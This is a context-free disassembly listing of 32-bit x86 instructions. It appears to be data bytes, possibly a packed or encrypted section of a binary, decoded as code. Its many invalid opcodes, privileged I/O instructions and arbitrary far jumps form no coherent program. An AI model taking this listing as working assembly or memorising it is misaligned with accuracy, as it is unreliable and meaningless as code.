  40b933:	sar    DWORD PTR [ebx+0x3ea8bc0e],cl
  40b939:	in     eax,0x75
  40b93b:	aam    0xc0
  40b93d:	aad    0xd9
  40b93f:	sbb    al,0xca
  40b941:	mov    ecx,0x8c380194
  40b946:	mov    dl,BYTE PTR [ecx]
  40b948:	dec    esi
  40b949:	daa    
  40b94a:	div    BYTE PTR [esi]
  40b94c:	dec    eax
  40b94d:	cli    
  40b94e:	fdivr  QWORD PTR [eax]
  40b950:	jne    0x40b922
  40b952:	shr    DWORD PTR [edx-0x6a],0xd0
  40b956:	lds    eax,FWORD PTR [esi]
  40b958:	gs jo  0x40b988
  40b95b:	hlt    
  40b95c:	dec    edx
  40b95d:	and    eax,0x226c69a5
  40b962:	xor    esp,DWORD PTR cs:[ebp+0x0]
  40b966:	xchg   ebx,eax
  40b967:	xor    eax,DWORD PTR [edi-0x6b51a2d4]
  40b96d:	adc    ebx,edi
  40b96f:	inc    esp
  40b970:	xor    DWORD PTR [ecx-0x292eaa84],edx
  40b976:	sub    al,BYTE PTR ds:0xc556729e
  40b97c:	mov    ah,bl
  40b97e:	scas   eax,DWORD PTR es:[edi]
  40b97f:	inc    edi
  40b980:	aaa    
  40b981:	dec    ebx
  40b982:	pop    ebx
  40b983:	fstp   TBYTE PTR [esi+eiz*2+0x2f]
  40b987:	jg     0x40b9fc
  40b989:	jae    0x40b9ee
  40b98b:	jecxz  0x40b9ab
  40b98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b98e:	fwait
  40b98f:	xchg   ebp,eax
  40b990:	mov    ecx,0xf1327ff
  40b995:	std    
  40b996:	(bad)  
  40b997:	jmp    0x1e352c04
  40b99c:	das    
  40b99d:	and    BYTE PTR [eax],dh
  40b99f:	in     eax,dx
  40b9a0:	jnp    0x40b939
  40b9a2:	and    DWORD PTR [ebx-0xfccd5ae],ecx
  40b9a8:	sub    DWORD PTR [eax],eax
  40b9aa:	jns    0x40b933
  40b9ac:	jle    0x40b989
  40b9ae:	push   0xe98f96ef
  40b9b3:	(bad)  [esi-0x5]
  40b9b6:	inc    ecx
  40b9b7:	xchg   ecx,eax
  40b9b8:	adc    bh,BYTE PTR [ecx+0x6d]
  40b9bb:	or     cl,BYTE PTR [ebx]
  40b9bd:	aas    
  40b9be:	mov    al,ds:0xa903058c
  40b9c3:	ror    DWORD PTR [ebx],cl
  40b9c5:	loopne 0x40b961
  40b9c7:	mov    al,0x3
  40b9c9:	xchg   esp,eax
  40b9ca:	in     al,dx
  40b9cb:	mov    al,0xc9
  40b9cd:	sbb    DWORD PTR ds:0x400c1154,ecx
  40b9d3:	adc    DWORD PTR [edi-0x68deccd0],esi
  40b9d9:	pop    es
  40b9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9db:	out    dx,eax
  40b9dc:	sub    esi,0xffffffc6
  40b9df:	test   BYTE PTR [edx-0x32],0x9b
  40b9e3:	je     0x40b978
  40b9e5:	imul   ecx,DWORD PTR [esi],0xffffffd9
  40b9e8:	int3   
  40b9e9:	adc    eax,0xd8294b54
  40b9ee:	jno    0x40ba31
  40b9f0:	not    BYTE PTR [esi-0x5c]
  40b9f3:	rcl    BYTE PTR [ebx],1
  40b9f5:	scas   al,BYTE PTR es:[edi]
  40b9f6:	loopne 0x40ba24
  40b9f8:	cmp    bl,ch
  40b9fa:	inc    esi
  40b9fb:	ss nop
  40b9fd:	ficom  WORD PTR [esi]
  40b9ff:	call   0x17da:0x5965655a
  40ba06:	push   edi
  40ba07:	lock fs pop ebp
  40ba0a:	xlat   BYTE PTR ds:[ebx]
  40ba0b:	jge    0x40b9f5
  40ba0d:	stc    
  40ba0e:	pop    ss
  40ba0f:	ins    BYTE PTR es:[edi],dx
  40ba10:	lds    edi,FWORD PTR [esi]
  40ba12:	fimul  WORD PTR [edi-0x5e]
  40ba15:	out    dx,al
  40ba16:	mov    dl,0xf7
  40ba18:	mov    BYTE PTR ds:[ecx],bh
  40ba1b:	retf   
  40ba1c:	push   esi
  40ba1d:	lods   al,BYTE PTR ds:[esi]
  40ba1e:	mov    ebx,0x9ddeb820
  40ba23:	pmulhw mm5,QWORD PTR [edi-0x3ffcd92f]
  40ba2a:	inc    esi
  40ba2b:	ror    BYTE PTR [edi],cl
  40ba2d:	mov    ecx,0xb86ca4b7
  40ba32:	fst    QWORD PTR [edx+eiz*2]
  40ba35:	jmp    0x40b9bc
  40ba37:	into   
  40ba38:	mov    BYTE PTR [esi+ebp*4+0x7a],al
  40ba3c:	popa   
  40ba3d:	int3   
  40ba3e:	into   
  40ba3f:	clc    
  40ba40:	dec    eax
  40ba41:	in     al,dx
  40ba42:	das    
  40ba43:	add    BYTE PTR [ebx+0x36e6bc3e],0xd9
  40ba4a:	punpckhwd mm3,QWORD PTR [ebx]
  40ba4d:	push   ds
  40ba4e:	sub    ecx,DWORD PTR [ecx+0x6a44e900]
  40ba54:	and    BYTE PTR [edx-0x6d9d7a37],bl
  40ba5a:	sbb    edx,DWORD PTR [eax]
  40ba5c:	sub    DWORD PTR [edi],esi
  40ba5e:	enter  0xfc33,0x27
  40ba62:	or     al,0x67
  40ba64:	pop    esp
  40ba65:	das    
  40ba66:	mov    WORD PTR [ebx+0x5f0b56b3],es
  40ba6c:	inc    edi
  40ba6d:	adc    esp,ecx
  40ba6f:	add    DWORD PTR es:[ecx+0x4a],eax
  40ba73:	adc    eax,0xae6a0917
  40ba78:	adc    DWORD PTR [edx+0xe0e05c0],eax
  40ba7e:	mov    al,ds:0x4a55ea9b
  40ba83:	arpl   WORD PTR ds:0xb6676f15,ax
  40ba89:	inc    eax
  40ba8a:	mov    cl,0xe2
  40ba8c:	push   edi
  40ba8d:	adc    esp,edx
  40ba8f:	xchg   esp,eax
  40ba90:	dec    eax
  40ba91:	and    cl,BYTE PTR [eax+0x4491bcd2]
  40ba97:	xchg   ebx,eax
  40ba98:	bound  eax,QWORD PTR [esi-0x9609a86]
  40ba9e:	fistp  WORD PTR [edx+0x7c]
  40baa1:	mov    ds,WORD PTR ds:0x332494a7
  40baa7:	rol    BYTE PTR [ecx+0x770473ae],1
  40baad:	or     DWORD PTR [esi+0x75],0x66
  40bab1:	dec    esi
  40bab2:	or     DWORD PTR ds:0xd69d1149,edi
  40bab8:	push   ebp
  40bab9:	xlat   BYTE PTR ds:[ebx]
  40baba:	scas   eax,DWORD PTR es:[edi]
  40babb:	jl     0x40ba95
  40babd:	mov    esi,0x63a78ba9
  40bac2:	inc    esi
  40bac3:	mov    eax,ds:0x1d7e4c08
  40bac8:	xchg   ebx,eax
  40bac9:	inc    ecx
  40baca:	int    0x3f
  40bacc:	aaa    
  40bacd:	rcl    BYTE PTR [ebp-0x1411569c],1
  40bad3:	cdq    
  40bad4:	mov    ecx,0xd5b385b3
  40bad9:	shl    DWORD PTR [edi+0x61],cl
  40badc:	in     al,dx
  40badd:	xor    BYTE PTR [esi+0x39],ah
  40bae0:	jp     0x40ba92
  40bae2:	pop    ds
  40bae3:	adc    al,0x40
  40bae5:	lahf   
  40bae6:	aad    0x60
  40bae8:	pusha  
  40bae9:	ret    0x96fb
  40baec:	dec    edx
  40baed:	fdivr  QWORD PTR [ecx-0x5160b2de]
  40baf3:	sahf   
  40baf4:	cld    
  40baf5:	fcomp  QWORD PTR [edi+0x11]
  40baf8:	mov    ch,0xc4
  40bafa:	xchg   DWORD PTR [eax+0x13],eax
  40bafd:	inc    ebx
  40bafe:	in     al,dx
  40baff:	test   al,0xd6
  40bb01:	test   al,0x8d
  40bb03:	xor    esp,DWORD PTR ss:[edx]
  40bb06:	in     eax,0xdf
  40bb08:	clc    
  40bb09:	cwde   
  40bb0a:	ja     0x40bb84
  40bb0c:	or     DWORD PTR [edi-0x2e],ebx
  40bb0f:	xchg   ecx,eax
  40bb10:	gs mov cl,0x57
  40bb13:	sbb    BYTE PTR [edx+ebp*8+0x5c18293b],bh
  40bb1a:	into   
  40bb1b:	iret   
  40bb1c:	dec    edi
  40bb1d:	(bad)  
  40bb1e:	ss xchg ebx,eax
  40bb20:	fucom  st(5)
  40bb22:	(bad)  
  40bb24:	mov    al,0xc8
  40bb26:	pusha  
  40bb27:	aad    0xb9
  40bb29:	pop    ebp
  40bb2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb2b:	pop    edi
  40bb2c:	push   eax
  40bb2d:	test   DWORD PTR [esi+0x61],esp
  40bb30:	push   ds
  40bb31:	sub    BYTE PTR ss:[ebp-0x5b],ch
  40bb35:	(bad)  
  40bb36:	add    BYTE PTR cs:[esi+0x28b27ba1],0x39
  40bb3e:	xchg   esp,eax
  40bb3f:	aam    0xd8
  40bb41:	pop    esp
  40bb42:	mov    dh,0x41
  40bb44:	mov    bl,0x6e
  40bb46:	lods   al,BYTE PTR ds:[esi]
  40bb47:	lock mov eax,ds:0xd2080962
  40bb4d:	pop    esi
  40bb4e:	mov    ecx,0xe586c206
  40bb53:	pop    es
  40bb54:	mov    bl,0xf3
  40bb56:	imul   esp,DWORD PTR [esi+0x5f],0xffffffd1
  40bb5a:	fwait
  40bb5b:	out    0x48,al
  40bb5d:	lock jne 0x40bb2f
  40bb60:	jo     0x40bbde
  40bb62:	fs out dx,eax
  40bb64:	imul   ecx,edi,0x7ce837df
  40bb6a:	push   eax
  40bb6b:	fwait
  40bb6c:	outs   dx,DWORD PTR ds:[esi]
  40bb6d:	push   edx
  40bb6e:	inc    edi
  40bb70:	in     al,0x34
  40bb72:	sub    al,0x64
  40bb74:	push   bx
  40bb76:	and    eax,0x37d0c7df
  40bb7b:	dec    ebp
  40bb7c:	mov    dh,0x7f
  40bb7e:	mov    ecx,0x7d5a2d16
  40bb83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb84:	aaa    
  40bb85:	jnp    0x40bb39
  40bb87:	xor    DWORD PTR [eax],0xffffffb3
  40bb8a:	cdq    
  40bb8b:	in     al,dx
  40bb8c:	mov    DWORD PTR [eax],edx
  40bb8e:	cmp    dl,BYTE PTR [ebx-0x6fcbbdd9]
  40bb94:	jg     0x40bb5f
  40bb96:	cmp    DWORD PTR [esp+edi*8+0x25],0x721f9b94
  40bb9e:	cmc    
  40bb9f:	retf   
  40bba0:	jo     0x40bb79
  40bba2:	jne    0x40bb4b
  40bba4:	sbb    al,0x76
  40bba6:	xor    ebp,DWORD PTR [ecx]
  40bba8:	int    0x7f
  40bbaa:	data16 arpl ax,di
  40bbad:	push   esi
  40bbae:	icebp  
  40bbaf:	jo     0x40bbdd
  40bbb1:	jg     0x40bb33
  40bbb3:	out    0x6b,eax
  40bbb5:	inc    ebx
  40bbb6:	jg     0x40bc35
  40bbb8:	inc    esi
  40bbb9:	xchg   DWORD PTR [ebx],esi
  40bbbb:	out    dx,al
  40bbbc:	out    dx,eax
  40bbbd:	in     eax,dx
  40bbbe:	ret    
  40bbbf:	xchg   ebx,eax
  40bbc0:	int    0x66
  40bbc2:	mov    ecx,0x20f0850b
  40bbc7:	scas   al,BYTE PTR es:[edi]
  40bbc8:	fistp  DWORD PTR [ecx+0x25819942]
  40bbce:	mov    ch,0x27
  40bbd0:	jnp    0x40bbb3
  40bbd2:	in     al,dx
  40bbd3:	lds    esi,FWORD PTR [eax]
  40bbd5:	aaa    
  40bbd6:	(bad)  
  40bbd7:	scas   eax,DWORD PTR es:[edi]
  40bbd8:	out    0xc1,al
  40bbda:	push   0x82edcbe2
  40bbdf:	aad    0x55
  40bbe1:	mov    al,ds:0x56fae46f
  40bbe6:	sahf   
  40bbe7:	in     al,dx
  40bbe8:	inc    ebp
  40bbe9:	je     0x40bc1a
  40bbeb:	cmp    edx,DWORD PTR [edx-0x1a]
  40bbee:	and    al,0xcd
  40bbf0:	jge    0x40bc1d
  40bbf2:	jne    0x40bbf5
  40bbf4:	mov    dh,0xdc
  40bbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbf7:	xor    ebp,DWORD PTR [ebp-0x536f2127]
  40bbfd:	mov    ebx,0xc27e767d
  40bc02:	aas    
  40bc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc04:	mov    ch,0x9
  40bc06:	jle    0x40bc0c
  40bc08:	and    edi,eax
  40bc0a:	imul   esi,DWORD PTR [edx+0x4],0xf98dadd3
  40bc11:	cld    
  40bc12:	shl    BYTE PTR [ebx+esi*4],cl
  40bc15:	sar    BYTE PTR [edi],cl
  40bc17:	push   eax
  40bc18:	inc    esp
  40bc19:	mov    ebp,cs
  40bc1b:	inc    esi
  40bc1c:	pop    edx
  40bc1d:	out    dx,al
  40bc1e:	popf   
  40bc1f:	popa   
  40bc20:	xor    BYTE PTR [ebp+0x3d7db8e6],dh
  40bc26:	cmp    DWORD PTR [ebp+0x35],ebp
  40bc29:	test   al,0xbc
  40bc2b:	(bad)  
  40bc2c:	fstp   QWORD PTR [edx-0x10ff8ed]
  40bc32:	test   BYTE PTR [ebx+0x46],al
  40bc35:	retf   0x3d02
  40bc38:	test   BYTE PTR [eax+0x7d],al
  40bc3b:	ror    DWORD PTR [eax+0x2d702a8c],1
  40bc41:	mov    eax,ds:0xb65e4793
  40bc46:	out    dx,al
  40bc47:	push   ss
  40bc48:	mov    eax,ds:0x35f5c5f0
  40bc4d:	mov    eax,0xce04c66d
  40bc52:	fadd   st,st(1)
  40bc54:	push   esp
  40bc55:	lea    ebp,[esi-0x7f98bef0]
  40bc5b:	jle    0x40bcd8
  40bc5d:	outs   dx,DWORD PTR ds:[esi]
  40bc5e:	fidivr WORD PTR [edi-0x51]
  40bc61:	push   0xffffffa8
  40bc63:	stos   DWORD PTR es:[edi],eax
  40bc64:	test   DWORD PTR [esi-0x33],0x6ffbf0d4
  40bc6b:	mov    al,ds:0x3e31ef26
  40bc70:	xor    cl,dh
  40bc72:	add    esp,DWORD PTR [eax]
  40bc74:	jbe    0x40bca0
  40bc76:	xor    DWORD PTR [ebx-0x80],ecx
  40bc79:	addr16 (bad) 
  40bc7c:	inc    edx
  40bc7d:	shl    ch,1
  40bc7f:	jo     0x40bcd7
  40bc81:	js     0x40bcf0
  40bc83:	outs   dx,BYTE PTR ds:[esi]
  40bc84:	in     al,dx
  40bc85:	lods   al,BYTE PTR ds:[esi]
  40bc86:	fs pop esi
  40bc88:	adc    ah,BYTE PTR [edx]
  40bc8a:	jecxz  0x40bcf1
  40bc8c:	xor    al,0x28
  40bc8e:	fnstsw WORD PTR [esi-0x526e6637]
  40bc94:	cli    
  40bc95:	or     BYTE PTR [ebx+0x285460f7],0xa6
  40bc9c:	cmp    ebx,edi
  40bc9e:	add    ah,BYTE PTR [ebp-0x56]
  40bca1:	mov    bh,0x5e
  40bca3:	out    0x1c,al
  40bca5:	xor    ch,cl
  40bca7:	cs aad 0x1e
  40bcaa:	int    0xed
  40bcac:	inc    esi
  40bcad:	(bad)  
  40bcae:	lahf   
  40bcaf:	push   ebp
  40bcb0:	stc    
  40bcb1:	sahf   
  40bcb2:	jmp    0xee59b602
  40bcb7:	inc    ecx
  40bcb8:	stc    
  40bcb9:	mov    ch,0x7a
  40bcbb:	outs   dx,DWORD PTR ds:[esi]
  40bcbc:	cdq    
  40bcbd:	or     DWORD PTR [esp+ebx*8+0x50],ebp
  40bcc1:	jp     0x40bc57
  40bcc3:	aaa    
  40bcc4:	push   esi
  40bcc5:	inc    esp
  40bcc6:	mov    dl,0x31
  40bcc8:	call   0x6e0c:0xb4bf2c06
  40bccf:	(bad)  
  40bcd0:	dec    edx
  40bcd1:	push   esi
  40bcd2:	sub    BYTE PTR [ecx-0x4f3b9214],dl
  40bcd8:	push   ebp
  40bcd9:	scas   al,BYTE PTR es:[edi]
  40bcda:	mov    ecx,0x63da36af
  40bcdf:	cli    
  40bce0:	aam    0xc9
  40bce2:	pop    edi
  40bce3:	in     al,dx
  40bce4:	fst    DWORD PTR [edx]
  40bce6:	sahf   
  40bce7:	fs ss cs pop es
  40bceb:	inc    edx
  40bcec:	dec    eax
  40bced:	mov    ebx,0x8798beeb
  40bcf2:	(bad)  
  40bcf3:	bound  esi,QWORD PTR [ebx+esi*1]
  40bcf6:	imul   ebx,DWORD PTR [eax+0x76],0xffffff86
  40bcfa:	mov    ?,WORD PTR [bp-0x27]
  40bcfe:	xor    bl,BYTE PTR [ebx+0xfbb0d7f]
  40bd04:	xchg   BYTE PTR [edx-0x13d7f07d],dl
  40bd0a:	add    ch,cl
  40bd0c:	repz push ss
  40bd0e:	sub    ebx,DWORD PTR [ebx+edi*4+0x6eba5f62]
  40bd15:	sub    bl,BYTE PTR [edi]
  40bd17:	ins    BYTE PTR es:[edi],dx
  40bd18:	pop    esp
  40bd19:	int    0x9f
  40bd1b:	ja     0x40bd0d
  40bd1d:	pop    esi
  40bd1e:	jecxz  0x40bcf1
  40bd20:	push   esi
  40bd21:	inc    esi
  40bd22:	dec    esi
  40bd23:	inc    ebx
  40bd24:	(bad)  
  40bd25:	arpl   bx,dx
  40bd27:	push   ebx
  40bd28:	xchg   ebx,eax
  40bd29:	jb     0x40bd63
  40bd2b:	aas    
  40bd2c:	shl    BYTE PTR [ecx-0x31d70204],0xcc
  40bd33:	xlat   BYTE PTR ds:[ebx]
  40bd34:	mov    cs,WORD PTR [ecx+eax*8+0x5f]
  40bd38:	stc    
  40bd39:	bound  esp,QWORD PTR [edi-0x1f]
  40bd3c:	cs push es
  40bd3e:	xchg   DWORD PTR [ecx-0xc],ebp
  40bd41:	fidivr WORD PTR [ebx-0x69805d8f]
  40bd47:	mov    bl,0xe0
  40bd49:	mov    BYTE PTR [esi],cl
  40bd4b:	popf   
  40bd4c:	bound  esp,QWORD PTR [ebx+edi*1+0x26e3637]
  40bd53:	(bad)  
  40bd54:	cmp    bl,BYTE PTR [eax+0x466d27d6]
  40bd5a:	mov    al,0xdc
  40bd5c:	dec    esp
  40bd5d:	push   ss
  40bd5e:	xchg   esi,eax
  40bd5f:	loopne 0x40bd44
  40bd61:	inc    eax
  40bd62:	or     al,0x27
  40bd64:	push   ebp
  40bd65:	inc    ecx
  40bd66:	mov    bl,0xbd
  40bd68:	mov    ebp,0x6f6eacee
  40bd6d:	mov    ecx,0xe65f621a
  40bd72:	jl     0x40bd80
  40bd74:	iret   
  40bd75:	xchg   edi,eax
  40bd76:	fisub  WORD PTR [esi+0x7e]
  40bd79:	mov    dl,0xe5
  40bd7b:	mov    edi,0xfacdec41
  40bd80:	imul   edx,DWORD PTR [ecx+0x64],0x56690e35
  40bd87:	push   0x45
  40bd89:	adc    eax,DWORD PTR [edx-0x47]
  40bd8c:	clc    
  40bd8d:	pop    ss
  40bd8e:	mov    bh,0xb4
  40bd90:	out    dx,al
  40bd91:	call   0x2a3e31b8
  40bd96:	xchg   ebp,eax
  40bd97:	sahf   
  40bd98:	enter  0xf57b,0xd9
  40bd9c:	push   ebp
  40bd9d:	lds    ecx,FWORD PTR [esi-0x1fbfa9fe]
  40bda3:	ret    
  40bda4:	add    DWORD PTR [ebx-0x6cd62104],ebx
  40bdaa:	inc    edi
  40bdab:	call   0x5437:0xf5f701c7
  40bdb2:	mov    al,dl
  40bdb4:	sbb    ecx,ebx
  40bdb6:	push   edi
  40bdb7:	and    DWORD PTR [ebx],0x690cbf74
  40bdbd:	or     bh,dl
  40bdbf:	jnp    0x40bd7b
  40bdc1:	js     0x40bdab
  40bdc3:	test   eax,0x3902e59a
  40bdc8:	sbb    bl,bh
  40bdca:	add    edx,DWORD PTR [esi+0x9]
  40bdcd:	mov    ds:0x358cb6e3,eax
  40bdd2:	out    dx,eax
  40bdd3:	push   es
  40bdd4:	dec    ebp
  40bdd5:	lock in eax,0x41
  40bdd8:	pop    ss
  40bdd9:	mov    ebx,0xa3c71c8b
  40bdde:	test   eax,0x917b7079
  40bde3:	fimul  WORD PTR [ebx+0x1019f60f]
  40bde9:	mov    esp,0x1efbb004
  40bdee:	xor    BYTE PTR [ebx-0x5],0x6c
  40bdf2:	mov    ah,0x97
  40bdf4:	jp     0x40bdfe
  40bdf6:	mov    ecx,0x89c85170
  40bdfb:	cmp    BYTE PTR [si-0x3abc],dh
  40be00:	push   eax
  40be01:	xchg   DWORD PTR [ebp+0x321a1cc9],edi
  40be07:	(bad)  
  40be08:	ss push ebp
  40be0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0b:	ss mov esp,0xe93e35da
  40be11:	add    ebx,DWORD PTR [eax+0x6a]
  40be14:	ins    BYTE PTR es:[edi],dx
  40be15:	pop    esi
  40be16:	pop    es
  40be17:	lods   al,BYTE PTR ds:[esi]
  40be18:	js     0x40bdee
  40be1a:	(bad)  
  40be1b:	(bad)  
  40be1c:	sub    ch,dl
  40be1e:	fimul  DWORD PTR ds:0x540759a3
  40be24:	or     al,0xe8
  40be26:	stos   DWORD PTR es:[edi],eax
  40be27:	adc    eax,0xa659f7db
  40be2c:	gs mov eax,0x1f4a76c7
  40be32:	test   al,0x48
  40be34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be35:	test   BYTE PTR [edx-0x34],0x60
  40be39:	cmp    al,0x9a
  40be3b:	in     eax,0x18
  40be3d:	and    al,0xc
  40be3f:	je     0x40be5f
  40be41:	mov    ds:0xd6e1ec5f,eax
  40be46:	gs mov ebp,0x56c7d230
  40be4c:	jmp    0x853cb592
  40be51:	into   
  40be52:	lock (bad) 
  40be54:	in     eax,dx
  40be55:	push   ebx
  40be56:	div    BYTE PTR [eax+0x12]
  40be59:	(bad)  
  40be5a:	stos   BYTE PTR es:[edi],al
  40be5b:	pop    esi
  40be5c:	dec    esi
  40be5d:	in     al,dx
  40be5e:	inc    esi
  40be5f:	pop    ds
  40be60:	mov    WORD PTR [edi-0x2d08b614],gs
  40be66:	(bad)  
  40be68:	xor    dh,BYTE PTR [edi-0x71f308b0]
  40be6e:	or     eax,0x85b0430b
  40be73:	arpl   si,dx
  40be75:	adc    dh,BYTE PTR [ecx]
  40be77:	shl    DWORD PTR [eax-0x9eccd98],1
  40be7d:	popa   
  40be7e:	std    
  40be7f:	into   
  40be80:	push   esp
  40be81:	jo     0x40be06
  40be83:	es fucom st(2)
  40be86:	mov    BYTE PTR ds:0x55c8f596,ah
  40be8c:	test   BYTE PTR [edx+0x65092313],dl
  40be92:	mov    edx,ebx
  40be94:	loope  0x40be36
  40be96:	jmp    0x9664:0x59281852
  40be9d:	add    DWORD PTR [edi+0x82b20b8],0x4a
  40bea4:	jmp    0x40bf02
  40bea6:	retf   
  40bea7:	sahf   
  40bea8:	or     BYTE PTR [ebx+0x29],0x4b
  40beac:	es push 0x26e25ef7
  40beb2:	(bad)  
  40beb3:	jmp    0x841:0x5ae710ba
  40beba:	xchg   esi,eax
  40bebb:	inc    esp
  40bebc:	in     al,0x8d
  40bebe:	ficom  DWORD PTR [ecx-0xc20d4bd]
  40bec4:	loope  0x40be4d
  40bec6:	mov    al,ds:0x100a0a0d
  40becb:	int3   
  40becc:	fimul  DWORD PTR [ebp+0x3d497104]
  40bed2:	(bad)  
  40bed3:	mov    ds:0xb59d171f,al
  40bed8:	dec    esi
  40bed9:	dec    edi
  40beda:	pop    ds
  40bedb:	dec    ebp
  40bedc:	rol    DWORD PTR [ebx],1
  40bede:	push   ds
  40bedf:	retf   0x5907
  40bee2:	fnstsw WORD PTR [ecx-0x555cc173]
  40bee8:	sar    DWORD PTR [ecx-0x5a70b2ca],0x96
  40beef:	iret   
  40bef0:	push   ebp
  40bef1:	xor    BYTE PTR [esp],ch
  40bef4:	cmp    BYTE PTR [esi],ch
  40bef6:	mov    al,ds:0x1839485a
  40befb:	pop    ecx
  40befc:	sub    ah,BYTE PTR [edi-0xf]
  40beff:	mov    ah,0xbe
  40bf01:	in     eax,dx
  40bf02:	jecxz  0x40be8e
  40bf04:	sub    al,0xdc
  40bf06:	data16 ins BYTE PTR es:[edi],dx
  40bf08:	lahf   
  40bf09:	les    edi,FWORD PTR [ebp-0x46]
  40bf0c:	dec    ebp
  40bf0d:	(bad)  
  40bf10:	jne    0x40be9d
  40bf12:	push   ebx
  40bf13:	fwait
  40bf14:	ds jns 0x40bebd
  40bf17:	arpl   WORD PTR [eax],sp
  40bf19:	adc    eax,0xe914b71a
  40bf1e:	call   0xd049:0xa842ee37
  40bf25:	and    DWORD PTR [eax+edi*4+0x739436c8],edx
  40bf2c:	ficom  WORD PTR [ebx]
  40bf2e:	adc    DWORD PTR [edx],ecx
  40bf30:	jle    0x40bfa4
  40bf32:	ins    BYTE PTR es:[edi],dx
  40bf33:	test   eax,0x6e6c746d
  40bf38:	aam    0x95
  40bf3a:	mov    esp,0xbbb54aec
  40bf3f:	adc    bl,BYTE PTR [edi-0x67]
  40bf42:	(bad)  
  40bf44:	fmul   st(7),st
  40bf46:	mov    DWORD PTR [edi+edx*8+0x68a97470],eax
  40bf4d:	add    al,0xbc
  40bf4f:	popf   
  40bf50:	mov    dh,0x8e
  40bf52:	and    eax,0x6a92d0fa
  40bf57:	pop    edi
  40bf58:	(bad)  
  40bf59:	mov    edx,0xa9ea744c
  40bf5e:	in     al,dx
  40bf5f:	test   al,0x5d
  40bf61:	jge    0x40bf94
  40bf63:	ffreep st(5)
  40bf65:	mov    ds:0x2fad4cf9,eax
  40bf6a:	int    0xd5
  40bf6c:	pop    ebx
  40bf6d:	or     dl,BYTE PTR [eax+eax*2-0x8]
  40bf71:	mov    ch,0xdd
  40bf73:	cmp    al,0x89
  40bf75:	cld    
  40bf76:	pop    ss
  40bf77:	mov    al,ds:0xdc8e0498
  40bf7c:	data16 neg BYTE PTR [ecx]
  40bf7f:	(bad)  
  40bf80:	ja     0x40bf4a
  40bf82:	mov    eax,ds:0xb6baec05
  40bf87:	retf   0x5a40
  40bf8a:	nop
  40bf8b:	inc    eax
  40bf8c:	push   ecx
  40bf8d:	mov    esp,0xa8221898
  40bf92:	inc    ecx
  40bf93:	shr    BYTE PTR [ecx],1
  40bf95:	sbb    DWORD PTR [edi-0x36f449a3],0xffffffc0
  40bf9c:	(bad)  
  40bf9d:	iret   
  40bf9e:	imul   edi,DWORD PTR [eax+0x2ec55391],0x19c00130
  40bfa8:	call   0xe948:0xc456ce1
  40bfaf:	xlat   BYTE PTR ds:[ebx]
  40bfb0:	scas   al,BYTE PTR es:[edi]
  40bfb1:	hlt    
  40bfb2:	push   ss
  40bfb3:	fs pushf 
  40bfb5:	sub    DWORD PTR [ebx*4-0x4d0a8fb1],edi
  40bfbc:	cli    
  40bfbd:	retf   
  40bfbe:	inc    ebp
  40bfbf:	pop    ebp
  40bfc0:	adc    ecx,edx
  40bfc2:	add    eax,DWORD PTR [esp+edx*2-0x128f0c3]
  40bfc9:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40bfcb:	repz inc esi
  40bfcd:	jecxz  0x40bf7b
  40bfcf:	ins    BYTE PTR es:[edi],dx
  40bfd0:	lock inc ebp
  40bfd2:	or     edx,DWORD PTR [esi]
  40bfd4:	(bad)  
  40bfd5:	cld    
  40bfd6:	cwde   
  40bfd7:	pusha  
  40bfd8:	pop    edx
  40bfd9:	sti    
  40bfda:	xchg   ebp,eax
  40bfdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfdd:	outs   dx,BYTE PTR ds:[esi]
  40bfde:	jle    0x40bfe6
  40bfe0:	or     al,0xcb
  40bfe2:	xor    DWORD PTR [edx-0x16],ecx
  40bfe5:	push   ebx
  40bfe6:	inc    esp
  40bfe7:	or     DWORD PTR [esi+0xd],esp
  40bfea:	jbe    0x40c025
  40bfec:	mov    eax,ds:0xad0a0962
  40bff2:	jb     0x40c060
  40bff4:	pop    ss
  40bff5:	sbb    eax,DWORD PTR gs:0x27f9f656
  40bffc:	or     BYTE PTR [ebx],0x46
  40bfff:	and    BYTE PTR [edi+0x46c24f2e],bl
  40c005:	gs inc esp
  40c007:	pusha  
  40c008:	ret    
  40c009:	mov    cl,0xb4
  40c00b:	jb     0x40c06c
  40c00d:	adc    eax,0x6f3f461b
  40c012:	les    ebx,FWORD PTR [eax+eax*4]
  40c015:	addr16 mov edi,0xa22f53e2
  40c01b:	ret    
  40c01c:	xchg   esi,eax
  40c01d:	je     0x40bfcb
  40c01f:	pushf  
  40c020:	add    al,0x71
  40c022:	clc    
  40c023:	sar    BYTE PTR [ebx-0x4a],cl
  40c026:	test   eax,0xaeb571d1
  40c02c:	imul   BYTE PTR [eax]
  40c02e:	iret   
  40c02f:	repz call DWORD PTR [eax]
  40c032:	and    BYTE PTR [ecx+0x6a],0x66
  40c036:	mov    esi,0x8020a52e
  40c03b:	push   esp
  40c03c:	mov    edx,0xe1ad8cb8
  40c041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c042:	leave  
  40c043:	or     esp,DWORD PTR [esp+edi*8-0x3b83aae2]
  40c04a:	add    al,BYTE PTR [edx+0x355fe50f]
  40c050:	mov    ah,0xd6
  40c052:	outs   dx,BYTE PTR ds:[esi]
  40c053:	mov    ds:0xfd73311b,al
  40c058:	out    0x8d,eax
  40c05a:	fwait
  40c05b:	push   ds
  40c05c:	sbb    esi,DWORD PTR [ebp-0x5e]
  40c05f:	inc    esi
  40c060:	stos   DWORD PTR es:[edi],eax
  40c061:	mov    ch,0xc6
  40c063:	pop    ebx
  40c064:	add    DWORD PTR [esi],ecx
  40c066:	xchg   esp,eax
  40c067:	pop    ecx
  40c068:	jg     0x40c0cd
  40c06a:	mov    edx,0x2cde2797
  40c070:	sti    
  40c071:	add    eax,0xdf0f09c9
  40c076:	mov    ds:0xf165a8af,eax
  40c07b:	or     al,0x52
  40c07d:	jecxz  0x40c0fe
  40c07f:	call   0xd183b1c1
  40c084:	mov    bl,0x9a
  40c086:	adc    eax,0x4a0b7188
  40c08b:	xchg   ebp,eax
